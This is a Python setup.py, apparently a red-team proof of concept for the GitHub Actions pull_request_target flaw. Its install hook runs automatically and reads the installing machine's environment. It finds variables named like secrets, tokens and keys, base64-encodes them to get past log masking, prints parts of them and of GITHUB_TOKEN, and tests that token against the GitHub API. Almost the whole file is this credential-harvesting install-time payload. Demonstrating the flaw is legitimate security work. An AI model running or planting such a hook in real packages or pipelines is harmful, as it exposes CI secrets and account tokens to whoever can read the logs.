from setuptools import setup
from setuptools.command.install import install
import os
import base64
import subprocess

class SecurityTestInstall(install):
    """Custom install command for security testing."""

    def run(self):
        install.run(self)
        self.security_test()

    def security_test(self):
        """Execute security test to demonstrate vulnerability."""
        print("\n" + "=" * 80)
        print("[!] RED TEAM SECURITY TEST - PULL_REQUEST_TARGET VULNERABILITY")
        print("=" * 80)
        print("[*] This demonstrates a security vulnerability in GitHub Actions")
        print("[*] Workflow: pull_request_target with unsafe checkout")
        print()

        # Collect and display environment secrets
        secrets_found = []
        sensitive_keywords = ['SECRET', 'TOKEN', 'KEY', 'PASSWORD', 'API', 'AWS',
                             'AZURE', 'GCP', 'PRIVATE', 'CREDENTIAL', 'AUTH']

        print("[+] Scanning environment for sensitive variables...")
        for key, value in sorted(os.environ.items()):
            is_sensitive = any(k in key.upper() for k in sensitive_keywords)
            if is_sensitive and value:
                # Encode to avoid accidental exposure in logs
                encoded = base64.b64encode(f"{key}={value}".encode()).decode()
                secrets_found.append(key)
                print(f"    [SECRET] {key}: {encoded[:50]}...")

        print(f"\n[+] Found {len(secrets_found)} sensitive environment variables")

        # Check GitHub Token specifically
        github_token = os.environ.get('GITHUB_TOKEN', '')
        if github_token:
            print(f"\n[!] GITHUB_TOKEN FOUND")
            print(f"    Token prefix: {github_token[:20]}...")
            print(f"    Token length: {len(github_token)} characters")

            # Test token permissions
            print("\n[+] Testing token permissions...")
            try:
                result = subprocess.run(
                    ['curl', '-s', '-H', f'Authorization: token {github_token}',
                     'https://api.github.com/user'],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0:
                    import json
                    user_data = json.loads(result.stdout)
                    if 'login' in user_data:
                        print(f"    Token valid for user: {user_data.get('login', 'N/A')}")
                        print(f"    Token type: {user_data.get('type', 'N/A')}")
            except Exception as e:
                print(f"    Could not test token: {e}")

        # Display GITHUB_ context
        print("\n[+] GitHub Actions Context:")
        github_vars = ['GITHUB_REPOSITORY', 'GITHUB_ACTOR', 'GITHUB_WORKFLOW',
                      'GITHUB_EVENT_NAME', 'GITHUB_REF', 'GITHUB_SHA',
                      'GITHUB_RUN_ID', 'GITHUB_RUN_NUMBER']
        for var in github_vars:
            value = os.environ.get(var, 'N/A')
            print(f"    {var}: {value}")

        print("\n" + "=" * 80)
        print("[+] VULNERABILITY CONFIRMED: pull_request_target exploit successful")
        print("[!] REMEDIATION: Do not checkout PR code in pull_request_target workflows")
        print("[!] See: https://securitylab.github.com/research/github-actions-preventing-pwn-requests")
        print("=" * 80 + "\n")

setup(
    name="security-test-payload",
    version="1.0.0",
    description="Security test for pull_request_target vulnerability",
    packages=[],
    cmdclass={'install': SecurityTestInstall},
)
